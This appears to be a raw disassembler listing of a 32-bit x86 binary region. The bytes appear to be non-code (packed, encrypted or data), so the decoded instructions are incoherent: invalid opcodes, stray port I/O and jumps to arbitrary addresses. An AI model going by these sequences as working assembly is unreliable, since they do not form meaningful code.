  420506:	a2 1a 75 e9 95       	mov    %al,0x95e9751a
  42050b:	eb 5e                	jmp    0x42056b
  42050d:	c1 c0 a8             	rol    $0xa8,%eax
  420510:	1f                   	pop    %ds
  420511:	ae                   	scas   %es:(%edi),%al
  420512:	cb                   	lret
  420513:	95                   	xchg   %eax,%ebp
  420514:	3d 97 b8 3a 79       	cmp    $0x793ab897,%eax
  420519:	09 f0                	or     %esi,%eax
  42051b:	00 1b                	add    %bl,(%ebx)
  42051d:	3c 9c                	cmp    $0x9c,%al
  42051f:	68 1b 1a 80 eb       	push   $0xeb801a1b
  420524:	51                   	push   %ecx
  420525:	ae                   	scas   %es:(%edi),%al
  420526:	22 dc                	and    %ah,%bl
  420528:	f6 bf 63 be f4 8e    	idivb  -0x710b419d(%edi)
  42052e:	03 cc                	add    %esp,%ecx
  420530:	91                   	xchg   %eax,%ecx
  420531:	34 19                	xor    $0x19,%al
  420533:	5d                   	pop    %ebp
  420534:	cb                   	lret
  420535:	43                   	inc    %ebx
  420536:	5f                   	pop    %edi
  420537:	35 ab 6b 30 19       	xor    $0x19306bab,%eax
  42053c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42053d:	b5 7e                	mov    $0x7e,%ch
  42053f:	e6 a2                	out    %al,$0xa2
  420541:	d5 17                	aad    $0x17
  420543:	d0 80 b8 57 d2 cd    	rolb   $1,-0x322da848(%eax)
  420549:	c2 b5 20             	ret    $0x20b5
  42054c:	25 33 b1 52 39       	and    $0x3952b133,%eax
  420551:	71 e4                	jno    0x420537
  420553:	2c 51                	sub    $0x51,%al
  420555:	5b                   	pop    %ebx
  420556:	8a f1                	mov    %cl,%dh
  420558:	4e                   	dec    %esi
  420559:	eb cb                	jmp    0x420526
  42055b:	c5 2c d2             	lds    (%edx,%edx,8),%ebp
  42055e:	eb f9                	jmp    0x420559
  420560:	79 d8                	jns    0x42053a
  420562:	e1 98                	loope  0x4204fc
  420564:	30 73 8b             	xor    %dh,-0x75(%ebx)
  420567:	7c 07                	jl     0x420570
  420569:	07                   	pop    %es
  42056a:	88 32                	mov    %dh,(%edx)
  42056c:	0d 61 26 1b fa       	or     $0xfa1b2661,%eax
  420571:	00 7f ff             	add    %bh,-0x1(%edi)
  420574:	f8                   	clc
  420575:	cf                   	iret
  420576:	3f                   	aas
  420577:	8f                   	(bad)
  420578:	95                   	xchg   %eax,%ebp
  420579:	f7 1d f9 cc 9d 46    	negl   0x469dccf9
  42057f:	7c 95                	jl     0x420516
  420581:	2c 3c                	sub    $0x3c,%al
  420583:	58                   	pop    %eax
  420584:	b9 74 72 25 a6       	mov    $0xa6257274,%ecx
  420589:	16                   	push   %ss
  42058a:	13 11                	adc    (%ecx),%edx
  42058c:	84 f9                	test   %bh,%cl
  42058e:	53                   	push   %ebx
  42058f:	95                   	xchg   %eax,%ebp
  420590:	c1 8d 49 b1 6c c7 e4 	rorl   $0xe4,-0x38934eb7(%ebp)
  420597:	db 38                	fstpt  (%eax)
  420599:	32 e0                	xor    %al,%ah
  42059b:	6f                   	outsl  %ds:(%esi),(%dx)
  42059c:	55                   	push   %ebp
  42059d:	1a 8e 30 52 2c c7    	sbb    -0x38d3add0(%esi),%cl
  4205a3:	0a 50 13             	or     0x13(%eax),%dl
  4205a6:	e7 b8                	out    %eax,$0xb8
  4205a8:	7d 9b                	jge    0x420545
  4205aa:	e5 d9                	in     $0xd9,%eax
  4205ac:	77 ab                	ja     0x420559
  4205ae:	80 b2 0e d8 94 75 01 	xorb   $0x1,0x7594d80e(%edx)
  4205b5:	20 da                	and    %bl,%dl
  4205b7:	5a                   	pop    %edx
  4205b8:	fe 41 7b             	incb   0x7b(%ecx)
  4205bb:	3c fc                	cmp    $0xfc,%al
  4205bd:	0c 3b                	or     $0x3b,%al
  4205bf:	4e                   	dec    %esi
  4205c0:	a9 b6 11 fc c2       	test   $0xc2fc11b6,%eax
  4205c5:	c9                   	leave
  4205c6:	42                   	inc    %edx
  4205c7:	e9 cf ed 38 9b       	jmp    0x9b7af39b
  4205cc:	bd 37 76 64 aa       	mov    $0xaa647637,%ebp
  4205d1:	57                   	push   %edi
  4205d2:	de bb 65 cf 56 55    	fidivrs 0x5556cf65(%ebx)
  4205d8:	90                   	nop
  4205d9:	19 00                	sbb    %eax,(%eax)
  4205db:	ff 2e                	ljmp   *(%esi)
  4205dd:	e9 bf cb 79 b0       	jmp    0xb0bbd1a1
  4205e2:	a0 fe 6d 96 db       	mov    0xdb966dfe,%al
  4205e7:	7f ab                	jg     0x420594
  4205e9:	92                   	xchg   %eax,%edx
  4205ea:	32 59 46             	xor    0x46(%ecx),%bl
  4205ed:	46                   	inc    %esi
  4205ee:	bf 32 38 1f b1       	mov    $0xb11f3832,%edi
  4205f3:	0b 2a                	or     (%edx),%ebp
  4205f5:	f8                   	clc
  4205f6:	a3 e4 1c d1 95       	mov    %eax,0x95d11ce4
  4205fb:	bd 0e aa 87 96       	mov    $0x9687aa0e,%ebp
  420600:	00 83 79 6f f2 5b    	add    %al,0x5bf26f79(%ebx)
  420606:	6b 48 e4 34          	imul   $0x34,-0x1c(%eax),%ecx
  42060a:	5d                   	pop    %ebp
  42060b:	21 d6                	and    %edx,%esi
  42060d:	0d 4f fa c8 e6       	or     $0xe6c8fa4f,%eax
  420612:	41                   	inc    %ecx
  420613:	d3 ba bf 33 ac ac    	sarl   %cl,-0x5353cc41(%edx)
  420619:	98                   	cwtl
  42061a:	25 85 9e 71 17       	and    $0x17719e85,%eax
  42061f:	5e                   	pop    %esi
  420620:	90                   	nop
  420621:	4a                   	dec    %edx
  420622:	09 37                	or     %esi,(%edi)
  420624:	82 23 fb             	andb   $0xfb,(%ebx)
  420627:	0f 74 fc             	pcmpeqb %mm4,%mm7
  42062a:	ed                   	in     (%dx),%eax
  42062b:	e8 66 d5 df c1       	call   0xc221db96
  420630:	58                   	pop    %eax
  420631:	ae                   	scas   %es:(%edi),%al
  420632:	d1 9a 4a 87 c3 73    	rcrl   $1,0x73c3874a(%edx)
  420638:	3c 60                	cmp    $0x60,%al
  42063a:	b5 4c                	mov    $0x4c,%ch
  42063c:	2e 39 a7 25 20 12 99 	cmp    %esp,%cs:-0x66eddfdb(%edi)
  420643:	fe                   	(bad)
  420644:	12 eb                	adc    %bl,%ch
  420646:	8b d7                	mov    %edi,%edx
  420648:	04 c4                	add    $0xc4,%al
  42064a:	7d b0                	jge    0x4205fc
  42064c:	f6 9c 6f 89 e8 75 61 	negb   0x6175e889(%edi,%ebp,2)
  420653:	62 da 4e             	(bad) {ru-bad},{%k3}
  420656:	53                   	push   %ebx
  420657:	3b cc                	cmp    %esp,%ecx
  420659:	27                   	daa
  42065a:	45                   	inc    %ebp
  42065b:	14 be                	adc    $0xbe,%al
  42065d:	00 37                	add    %dh,(%edi)
  42065f:	ed                   	in     (%dx),%eax
  420660:	b0 d9                	mov    $0xd9,%al
  420662:	29 c6                	sub    %eax,%esi
  420664:	a2 b2 1b 9f 94       	mov    %al,0x949f1bb2
  420669:	8b 0d 78 86 64 ff    	mov    0xff648678,%ecx
  42066f:	50                   	push   %eax
  420670:	78 3d                	js     0x4206af
  420672:	f1                   	int1
  420673:	29 6a 16             	sub    %ebp,0x16(%edx)
  420676:	e3 02                	jecxz  0x42067a
  420678:	5c                   	pop    %esp
  420679:	ef                   	out    %eax,(%dx)
  42067a:	d5 db                	aad    $0xdb
  42067c:	4e                   	dec    %esi
  42067d:	c8 c7 b4 40          	enter  $0xb4c7,$0x40
  420681:	a1 b9 8d 32 7a       	mov    0x7a328db9,%eax
  420686:	ab                   	stos   %eax,%es:(%edi)
  420687:	66 24 53             	data16 and $0x53,%al
  42068a:	9d                   	popf
  42068b:	3f                   	aas
  42068c:	16                   	push   %ss
  42068d:	2c 8f                	sub    $0x8f,%al
  42068f:	18 f7                	sbb    %dh,%bh
  420691:	fa                   	cli
  420692:	7e 0e                	jle    0x4206a2
  420694:	77 53                	ja     0x4206e9
  420696:	8a 32                	mov    (%edx),%dh
  420698:	ac                   	lods   %ds:(%esi),%al
  420699:	b6 a2                	mov    $0xa2,%dh
  42069b:	e7 fa                	out    %eax,$0xfa
  42069d:	23 16                	and    (%esi),%edx
  42069f:	45                   	inc    %ebp
  4206a0:	91                   	xchg   %eax,%ecx
  4206a1:	68 c4 db 3b b9       	push   $0xb93bdbc4
  4206a6:	7b 2e                	jnp    0x4206d6
  4206a8:	3f                   	aas
  4206a9:	66 09 ab 1e 32 f8 e2 	or     %bp,-0x1d07cde2(%ebx)
  4206b0:	15 67 77 8a 5c       	adc    $0x5c8a7767,%eax
  4206b5:	96                   	xchg   %eax,%esi
  4206b6:	d8 21                	fsubs  (%ecx)
  4206b8:	78 7f                	js     0x420739
  4206ba:	a9 4e c2 dc 2f       	test   $0x2fdcc24e,%eax
  4206bf:	70 95                	jo     0x420656
  4206c1:	bb 95 38 fe 88       	mov    $0x88fe3895,%ebx
  4206c6:	c2 bc 46             	ret    $0x46bc
  4206c9:	25 f9 fd c3 dd       	and    $0xddc3fdf9,%eax
  4206ce:	8c 5a 1b             	mov    %ds,0x1b(%edx)
  4206d1:	5d                   	pop    %ebp
  4206d2:	10 84 1b 21 b7 f5 6a 	adc    %al,0x6af5b721(%ebx,%ebx,1)
  4206d9:	65 78 b9             	gs js  0x420695
  4206dc:	ba 3a db 8a f0       	mov    $0xf08adb3a,%edx
  4206e1:	d3 c5                	rol    %cl,%ebp
  4206e3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4206e4:	eb fb                	jmp    0x4206e1
  4206e6:	96                   	xchg   %eax,%esi
  4206e7:	b2 6a                	mov    $0x6a,%dl
  4206e9:	76 7e                	jbe    0x420769
  4206eb:	56                   	push   %esi
  4206ec:	76 86                	jbe    0x420674
  4206ee:	3e 2b 9c f7 3e f6 75 	sub    %ds:-0x408a09c2(%edi,%esi,8),%ebx
  4206f5:	bf 
  4206f6:	5f                   	pop    %edi
  4206f7:	05 30 b5 54 fa       	add    $0xfa54b530,%eax
  4206fc:	4f                   	dec    %edi
  4206fd:	01 07                	add    %eax,(%edi)
  4206ff:	d3 80 bf f9 ab 72    	roll   %cl,0x72abf9bf(%eax)
  420705:	98                   	cwtl
  420706:	eb 84                	jmp    0x42068c
  420708:	64 71 dd             	fs jno 0x4206e8
  42070b:	5d                   	pop    %ebp
  42070c:	56                   	push   %esi
  42070d:	4a                   	dec    %edx
  42070e:	cf                   	iret
  42070f:	36 48                	ss dec %eax
  420711:	23 c1                	and    %ecx,%eax
  420713:	0f 3a fc             	(bad)
  420716:	e0 b2                	loopne 0x4206ca
  420718:	68 91 2d 31 39       	push   $0x39312d91
  42071d:	9d                   	popf
  42071e:	d6                   	salc
  42071f:	9a 10 db 89 73 fd 2d 	lcall  $0x2dfd,$0x7389db10
  420726:	21 dc                	and    %ebx,%esp
  420728:	f4                   	hlt
  420729:	3b 6d 25             	cmp    0x25(%ebp),%ebp
  42072c:	e6 6c                	out    %al,$0x6c
  42072e:	5b                   	pop    %ebx
  42072f:	0b 28                	or     (%eax),%ebp
  420731:	15 ae d7 ca 7b       	adc    $0x7bcad7ae,%eax
  420736:	b6 40                	mov    $0x40,%dh
  420738:	1e                   	push   %ds
  420739:	9d                   	popf
  42073a:	34 c9                	xor    $0xc9,%al
  42073c:	af                   	scas   %es:(%edi),%eax
  42073d:	71 28                	jno    0x420767
  42073f:	6f                   	outsl  %ds:(%esi),(%dx)
  420740:	bc 47 d1 ce 62       	mov    $0x62ced147,%esp
  420745:	29 f4                	sub    %esi,%esp
  420747:	0b 3e                	or     (%esi),%edi
  420749:	0e                   	push   %cs
  42074a:	fd                   	std
  42074b:	58                   	pop    %eax
  42074c:	7f 14                	jg     0x420762
  42074e:	ce                   	into
  42074f:	3a d0                	cmp    %al,%dl
  420751:	b3 ad                	mov    $0xad,%bl
  420753:	53                   	push   %ebx
  420754:	7b df                	jnp    0x420735
  420756:	bb 1e b3 17 e5       	mov    $0xe517b31e,%ebx
  42075b:	20 4c 52 d0          	and    %cl,-0x30(%edx,%edx,2)
  42075f:	5b                   	pop    %ebx
  420760:	51                   	push   %ecx
  420761:	e9 c4 22 41 8e       	jmp    0x8e832a2a
  420766:	f5                   	cmc
  420767:	b5 7b                	mov    $0x7b,%ch
  420769:	bc 72 94 64 c4       	mov    $0xc4649472,%esp
  42076e:	5f                   	pop    %edi
  42076f:	ff 8d 17 51 99 83    	decl   -0x7c66aee9(%ebp)
  420775:	3c 43                	cmp    $0x43,%al
  420777:	7b 93                	jnp    0x42070c
  420779:	78 75                	js     0x4207f0
  42077b:	75 31                	jne    0x4207ae
  42077d:	6b 23 94             	imul   $0xffffff94,(%ebx),%esp
  420780:	ee                   	out    %al,(%dx)
  420781:	d0 34 c0             	shlb   $1,(%eax,%eax,8)
  420784:	96                   	xchg   %eax,%esi
  420785:	48                   	dec    %eax
  420786:	2a a7 11 d1 db 80    	sub    -0x7f242eef(%edi),%ah
  42078c:	67 57                	addr16 push %edi
  42078e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42078f:	28 27                	sub    %ah,(%edi)
  420791:	35 04 5c 59 bc       	xor    $0xbc595c04,%eax
  420796:	5c                   	pop    %esp
  420797:	f3 19 f3             	repz sbb %esi,%ebx
  42079a:	3a 4c 7e 77          	cmp    0x77(%esi,%edi,2),%cl
  42079e:	78 40                	js     0x4207e0
  4207a0:	25 a7 60 3e 3f       	and    $0x3f3e60a7,%eax
  4207a5:	cd ce                	int    $0xce
  4207a7:	6a 2d                	push   $0x2d
  4207a9:	77 13                	ja     0x4207be
  4207ab:	ec                   	in     (%dx),%al
  4207ac:	d6                   	salc
  4207ad:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4207ae:	9d                   	popf
  4207af:	21 b4 92 93 a7 63 81 	and    %esi,-0x7e9c586d(%edx,%edx,4)
  4207b6:	eb ba                	jmp    0x420772
  4207b8:	fd                   	std
  4207b9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4207ba:	70 58                	jo     0x420814
  4207bc:	be d6 67 80 ac       	mov    $0xac8067d6,%esi
  4207c1:	6d                   	insl   (%dx),%es:(%edi)
  4207c2:	5c                   	pop    %esp
  4207c3:	59                   	pop    %ecx
  4207c4:	3d 1f a6 db 87       	cmp    $0x87dba61f,%eax
  4207c9:	02 38                	add    (%eax),%bh
  4207cb:	eb b6                	jmp    0x420783
  4207cd:	f9                   	stc
  4207ce:	50                   	push   %eax
  4207cf:	c5 a3 d1 27 bd 9a    	lds    -0x6542d82f(%ebx),%esp
  4207d5:	93                   	xchg   %eax,%ebx
  4207d6:	e6 66                	out    %al,$0x66
  4207d8:	19 fe                	sbb    %edi,%esi
  4207da:	c3                   	ret
  4207db:	6b 3f ae             	imul   $0xffffffae,(%edi),%edi
  4207de:	07                   	pop    %es
  4207df:	57                   	push   %edi
  4207e0:	c5 35 e8 22 72 2f    	lds    0x2f7222e8,%esi
  4207e6:	3f                   	aas
  4207e7:	fb                   	sti
  4207e8:	56                   	push   %esi
  4207e9:	10 3e                	adc    %bh,(%esi)
  4207eb:	26 b3 be             	es mov $0xbe,%bl
  4207ee:	bd 5b c5 9f 44       	mov    $0x449fc55b,%ebp
  4207f3:	84 9a 93 a0 b8 1d    	test   %bl,0x1db8a093(%edx)
  4207f9:	53                   	push   %ebx
  4207fa:	83 d5 0d             	adc    $0xd,%ebp
  4207fd:	53                   	push   %ebx
  4207fe:	d0 09                	rorb   $1,(%ecx)
  420800:	03 48 b6             	add    -0x4a(%eax),%ecx
  420803:	b9 f2 d4 0f dd       	mov    $0xdd0fd4f2,%ecx
  420808:	e9 e4 44 7a d6       	jmp    0xd6bc4cf1
  42080d:	01 4f ef             	add    %ecx,-0x11(%edi)
  420810:	cf                   	iret
  420811:	16                   	push   %ss
  420812:	5c                   	pop    %esp
  420813:	21 a7 45 2e c3 af    	and    %esp,-0x503cd1bb(%edi)
  420819:	05 dc ff 1f f7       	add    $0xf71fffdc,%eax
  42081e:	b7 c0                	mov    $0xc0,%bh
  420820:	be b7 6c c8 f6       	mov    $0xf6c86cb7,%esi
  420825:	1a 0e                	sbb    (%esi),%cl
  420827:	78 d2                	js     0x4207fb
  420829:	4d                   	dec    %ebp
  42082a:	0f 65 b3 4f df 2c 59 	pcmpgtw 0x592cdf4f(%ebx),%mm6
  420831:	24 f1                	and    $0xf1,%al
  420833:	ec                   	in     (%dx),%al
  420834:	4a                   	dec    %edx
  420835:	00 a3 c2 4e bd d4    	add    %ah,-0x2b42b13e(%ebx)
  42083b:	b1 61                	mov    $0x61,%cl
  42083d:	d3 a7 9e 90 d6 88    	shll   %cl,-0x77296f62(%edi)
  420843:	9e                   	sahf
  420844:	13 6c 7e a0          	adc    -0x60(%esi,%edi,2),%ebp
  420848:	dd 03                	fldl   (%ebx)
  42084a:	dd 32                	fnsave (%edx)
  42084c:	fe                   	(bad)
  42084d:	15 2f 2c 32 fd       	adc    $0xfd322c2f,%eax
  420852:	61                   	popa
  420853:	ef                   	out    %eax,(%dx)
  420854:	8f                   	(bad)
  420855:	a0 a6 44 ac 55       	mov    0x55ac44a6,%al
  42085a:	b5 87                	mov    $0x87,%ch
  42085c:	4b                   	dec    %ebx
  42085d:	89 71 88             	mov    %esi,-0x78(%ecx)
  420860:	ad                   	lods   %ds:(%esi),%eax
  420861:	2d 29 ff f1 43       	sub    $0x43f1ff29,%eax
  420866:	7a 6a                	jp     0x4208d2
  420868:	f1                   	int1
  420869:	38 1d 34 92 dc fe    	cmp    %bl,0xfedc9234
  42086f:	19 69 a2             	sbb    %ebp,-0x5e(%ecx)
  420872:	18 a1 99 96 13 55    	sbb    %ah,0x55139699(%ecx)
  420878:	43                   	inc    %ebx
  420879:	1a b0 38 21 22 ed    	sbb    -0x12dddec8(%eax),%dh
  42087f:	2d a9 0b e0 16       	sub    $0x16e00ba9,%eax
  420884:	28 e3                	sub    %ah,%bl
  420886:	89 8d 1a e1 9d fa    	mov    %ecx,-0x5621ee6(%ebp)
  42088c:	b6 b8                	mov    $0xb8,%dh
  42088e:	08 bc 9f 53 81 cd d7 	or     %bh,-0x28327ead(%edi,%ebx,4)
  420895:	e1 5e                	loope  0x4208f5
  420897:	84 c1                	test   %al,%cl
  420899:	f8                   	clc
  42089a:	48                   	dec    %eax
  42089b:	fb                   	sti
  42089c:	f3 ff                	repz (bad)
  42089e:	7a f2                	jp     0x420892
  4208a0:	ed                   	in     (%dx),%eax
  4208a1:	f6 74 ce e5          	divb   -0x1b(%esi,%ecx,8)
  4208a5:	87 0c 9a             	xchg   %ecx,(%edx,%ebx,4)
  4208a8:	f3 ae                	repz scas %es:(%edi),%al
  4208aa:	7a bd                	jp     0x420869
  4208ac:	c1 51 68 64          	rcll   $0x64,0x68(%ecx)
  4208b0:	1f                   	pop    %ds
  4208b1:	78 86                	js     0x420839
  4208b3:	0f 6a b9 3e bc 41 30 	punpckhdq 0x3041bc3e(%ecx),%mm7
  4208ba:	c8 34 53 30          	enter  $0x5334,$0x30
  4208be:	d2 e9                	shr    %cl,%cl
  4208c0:	eb 45                	jmp    0x420907
  4208c2:	26 16                	es push %ss
  4208c4:	be 8a 20 67 cf       	mov    $0xcf67208a,%esi
  4208c9:	1e                   	push   %ds
  4208ca:	b5 b8                	mov    $0xb8,%ch
  4208cc:	b5 f4                	mov    $0xf4,%ch
  4208ce:	ae                   	scas   %es:(%edi),%al
  4208cf:	a9 6d 05 2a b4       	test   $0xb42a056d,%eax
  4208d4:	e5 ee                	in     $0xee,%eax
  4208d6:	9c                   	pushf
  4208d7:	6c                   	insb   (%dx),%es:(%edi)
  4208d8:	1d 3a 57 df 9f       	sbb    $0x9fdf573a,%eax
  4208dd:	69 8f b4 79 35 95 d6 	imul   $0xd245afd6,-0x6aca864c(%edi),%ecx
  4208e4:	af 45 d2 
  4208e7:	c9                   	leave
  4208e8:	99                   	cltd
  4208e9:	da a6 1d 4d ae c3    	fisubl -0x3c51b2e3(%esi)
  4208ef:	6b 47 16 30          	imul   $0x30,0x16(%edi),%eax
  4208f3:	48                   	dec    %eax
  4208f4:	ff 51 a8             	call   *-0x58(%ecx)
  4208f7:	df 64 d8 ee          	fbld   -0x12(%eax,%ebx,8)
  4208fb:	41                   	inc    %ecx
  4208fc:	76 d4                	jbe    0x4208d2
  4208fe:	4a                   	dec    %edx
  4208ff:	b0 84                	mov    $0x84,%al
  420901:	7b e7                	jnp    0x4208ea
  420903:	06                   	push   %es
  420904:	32 6e e4             	xor    -0x1c(%esi),%ch
  420907:	43                   	inc    %ebx
  420908:	6c                   	insb   (%dx),%es:(%edi)
  420909:	6f                   	outsl  %ds:(%esi),(%dx)
  42090a:	14 a2                	adc    $0xa2,%al
  42090c:	42                   	inc    %edx
  42090d:	da 8f 70 47 22 c3    	fimull -0x3cddb890(%edi)
  420913:	03 77 42             	add    0x42(%edi),%esi
  420916:	f3 70 17             	repz jo 0x420930
  420919:	b1 67                	mov    $0x67,%cl
  42091b:	4e                   	dec    %esi
  42091c:	1c cc                	sbb    $0xcc,%al
  42091e:	95                   	xchg   %eax,%ebp
  42091f:	f8                   	clc
  420920:	d6                   	salc
  420921:	8b f6                	mov    %esi,%esi
  420923:	a9 fe e2 3e 3d       	test   $0x3d3ee2fe,%eax
  420928:	80 bb 28 dd 09 0f 8d 	cmpb   $0x8d,0xf09dd28(%ebx)
  42092f:	02 dd                	add    %ch,%bl
  420931:	9b                   	fwait
  420932:	61                   	popa
  420933:	bb ce d7 bc a5       	mov    $0xa5bcd7ce,%ebx
  420938:	8f                   	(bad)
  420939:	d5 be                	aad    $0xbe
  42093b:	e7 f3                	out    %eax,$0xf3
  42093d:	2d eb 07 d2 8d       	sub    $0x8dd207eb,%eax
  420942:	e9 84 13 4c 83       	jmp    0x838e1ccb
  420947:	78 74                	js     0x4209bd
  420949:	be 78 9e 0e ad       	mov    $0xad0e9e78,%esi
  42094e:	13 cf                	adc    %edi,%ecx
  420950:	68 2b 40 7f 3b       	push   $0x3b7f402b
  420955:	db d3                	fcmovnbe %st(3),%st
  420957:	e0 1c                	loopne 0x420975
  420959:	56                   	push   %esi
  42095a:	48                   	dec    %eax
  42095b:	42                   	inc    %edx
  42095c:	7f e7                	jg     0x420945
  42095e:	3c 5d                	cmp    $0x5d,%al
  420960:	25 37 c9 7b 32       	and    $0x327bc937,%eax
  420965:	3a 3a                	cmp    (%edx),%bh
  420967:	58                   	pop    %eax
  420968:	ea e2 cd 7d f9 0f 13 	ljmp   $0x130f,$0xf97dcde2
  42096f:	56                   	push   %esi
  420970:	f8                   	clc
  420971:	e2 c6                	loop   0x420939
  420973:	56                   	push   %esi
  420974:	6f                   	outsl  %ds:(%esi),(%dx)
  420975:	b7 ef                	mov    $0xef,%bh
  420977:	f8                   	clc
  420978:	5f                   	pop    %edi
  420979:	19 e0                	sbb    %esp,%eax
  42097b:	d0 ce                	ror    $1,%dh
  42097d:	62 32                	bound  %esi,(%edx)
  42097f:	20 3f                	and    %bh,(%edi)
  420981:	43                   	inc    %ebx
  420982:	f1                   	int1
  420983:	f3 f0 a4             	rep lock movsb %ds:(%esi),%es:(%edi)
  420986:	6a 85                	push   $0xffffff85
  420988:	e0 f7                	loopne 0x420981
  42098a:	75 6d                	jne    0x4209f9
  42098c:	f1                   	int1
  42098d:	e1 1f                	loope  0x4209ae
  42098f:	43                   	inc    %ebx
  420990:	dd 3a                	fnstsw (%edx)
  420992:	ee                   	out    %al,(%dx)
  420993:	f5                   	cmc
  420994:	85 86 0f cf 2c ef    	test   %eax,-0x10d330f1(%esi)
  42099a:	21 54 f0 d6          	and    %edx,-0x2a(%eax,%esi,8)
  42099e:	94                   	xchg   %eax,%esp
  42099f:	bc 1d 9e 56 47       	mov    $0x47569e1d,%esp
  4209a4:	8e 47 fb             	mov    -0x5(%edi),%es
  4209a7:	68 3a 5a ef 57       	push   $0x57ef5a3a
  4209ac:	20 22                	and    %ah,(%edx)
  4209ae:	2b d7                	sub    %edi,%edx
  4209b0:	76 c9                	jbe    0x42097b
  4209b2:	61                   	popa
  4209b3:	5d                   	pop    %ebp
  4209b4:	99                   	cltd
  4209b5:	1f                   	pop    %ds
  4209b6:	58                   	pop    %eax
  4209b7:	0a 04 c3             	or     (%ebx,%eax,8),%al
  4209ba:	35 68 8c a8 2a       	xor    $0x2aa88c68,%eax
  4209bf:	bc 1c 1a da af       	mov    $0xafda1a1c,%esp
  4209c4:	2e bf 3e af f6 57    	cs mov $0x57f6af3e,%edi
  4209ca:	72 6f                	jb     0x420a3b
  4209cc:	b4 c0                	mov    $0xc0,%ah
  4209ce:	2e 4f                	cs dec %edi
  4209d0:	f5                   	cmc
  4209d1:	6b 7c ba 0f 62       	imul   $0x62,0xf(%edx,%edi,4),%edi
  4209d6:	eb 39                	jmp    0x420a11
  4209d8:	d1 bd 58 9e 34 be    	sarl   $1,-0x41cb61a8(%ebp)
  4209de:	08 a8 68 fc 16 99    	or     %ch,-0x66e90398(%eax)
  4209e4:	72 ee                	jb     0x4209d4
  4209e6:	8b 36                	mov    (%esi),%esi
  4209e8:	54                   	push   %esp
  4209e9:	4f                   	dec    %edi
  4209ea:	a9 96 e7 8c bd       	test   $0xbd8ce796,%eax
  4209ef:	40                   	inc    %eax
  4209f0:	b1 34                	mov    $0x34,%cl
  4209f2:	b0 fc                	mov    $0xfc,%al
  4209f4:	a9 2e 5c 3a 4f       	test   $0x4f3a5c2e,%eax
  4209f9:	95                   	xchg   %eax,%ebp
  4209fa:	c2 26 6b             	ret    $0x6b26
  4209fd:	74 04                	je     0x420a03
  4209ff:	17                   	pop    %ss
  420a00:	7d 65                	jge    0x420a67
  420a02:	79 14                	jns    0x420a18
  420a04:	fd                   	std
  420a05:	b5 5b                	mov    $0x5b,%ch
  420a07:	96                   	xchg   %eax,%esi
  420a08:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  420a09:	aa                   	stos   %al,%es:(%edi)
  420a0a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  420a0b:	93                   	xchg   %eax,%ebx
  420a0c:	84 1b                	test   %bl,(%ebx)
  420a0e:	45                   	inc    %ebp
  420a0f:	bc 85 c8 c8 88       	mov    $0x88c8c885,%esp
  420a14:	5e                   	pop    %esi
  420a15:	86 f4                	xchg   %dh,%ah
  420a17:	db 50 8b             	fistl  -0x75(%eax)
  420a1a:	24 b0                	and    $0xb0,%al
  420a1c:	db 3e                	fstpt  (%esi)
  420a1e:	36 b7 c0             	ss mov $0xc0,%bh
  420a21:	c5 d5 28             	(bad)
  420a24:	83 02 ba             	addl   $0xffffffba,(%edx)
  420a27:	e1 f7                	loope  0x420a20
  420a29:	2c ef                	sub    $0xef,%al
  420a2b:	53                   	push   %ebx
  420a2c:	b9 92 3f 38 1d       	mov    $0x1d383f92,%ecx
  420a31:	7c 2a                	jl     0x420a5d
  420a33:	be 96 f2 3c 28       	mov    $0x283cf296,%esi
  420a38:	dc 69 f8             	fsubrl -0x8(%ecx)
  420a3b:	da 5d 63             	ficompl 0x63(%ebp)
  420a3e:	2c c8                	sub    $0xc8,%al
  420a40:	75 0c                	jne    0x420a4e
  420a42:	9a a5 f2 9f cb 4a fc 	lcall  $0xfc4a,$0xcb9ff2a5
  420a49:	01 70 d6             	add    %esi,-0x2a(%eax)
  420a4c:	f8                   	clc
  420a4d:	8f                   	(bad)
  420a4e:	2f                   	das
  420a4f:	78 a5                	js     0x4209f6
  420a51:	70 01                	jo     0x420a54
  420a53:	45                   	inc    %ebp
  420a54:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  420a55:	c3                   	ret
  420a56:	a9 27 b9 1b ae       	test   $0xae1bb927,%eax
  420a5b:	2c 46                	sub    $0x46,%al
  420a5d:	c2 cc dc             	ret    $0xdccc
  420a60:	f5                   	cmc
  420a61:	dc 49 b0             	fmull  -0x50(%ecx)
  420a64:	21 4d 5a             	and    %ecx,0x5a(%ebp)
  420a67:	50                   	push   %eax
  420a68:	6f                   	outsl  %ds:(%esi),(%dx)
  420a69:	9c                   	pushf
  420a6a:	09 78 e3             	or     %edi,-0x1d(%eax)
  420a6d:	14 fe                	adc    $0xfe,%al
  420a6f:	cf                   	iret
  420a70:	34 2e                	xor    $0x2e,%al
  420a72:	0e                   	push   %cs
  420a73:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  420a74:	e9 f9 f0 7f 09       	jmp    0x9c1fb72
  420a79:	ed                   	in     (%dx),%eax
  420a7a:	d6                   	salc
  420a7b:	f2 1b 66 4f          	repnz sbb 0x4f(%esi),%esp
  420a7f:	ac                   	lods   %ds:(%esi),%al
  420a80:	ab                   	stos   %eax,%es:(%edi)
  420a81:	0d 58 2f be 2c       	or     $0x2cbe2f58,%eax
  420a86:	44                   	inc    %esp
  420a87:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  420a88:	cf                   	iret
  420a89:	52                   	push   %edx
  420a8a:	25 a4 07 dd 04       	and    $0x4dd07a4,%eax
  420a8f:	6f                   	outsl  %ds:(%esi),(%dx)
  420a90:	f1                   	int1
  420a91:	1f                   	pop    %ds
  420a92:	6e                   	outsb  %ds:(%esi),(%dx)
  420a93:	b7 a0                	mov    $0xa0,%bh
  420a95:	ab                   	stos   %eax,%es:(%edi)
  420a96:	f8                   	clc
  420a97:	f9                   	stc
  420a98:	e0 ab                	loopne 0x420a45
  420a9a:	20 7a 02             	and    %bh,0x2(%edx)
  420a9d:	47                   	inc    %edi
  420a9e:	57                   	push   %edi
  420a9f:	6e                   	outsb  %ds:(%esi),(%dx)
  420aa0:	d1 3a                	sarl   $1,(%edx)
  420aa2:	c2 0a 32             	ret    $0x320a
  420aa5:	44                   	inc    %esp
  420aa6:	5f                   	pop    %edi
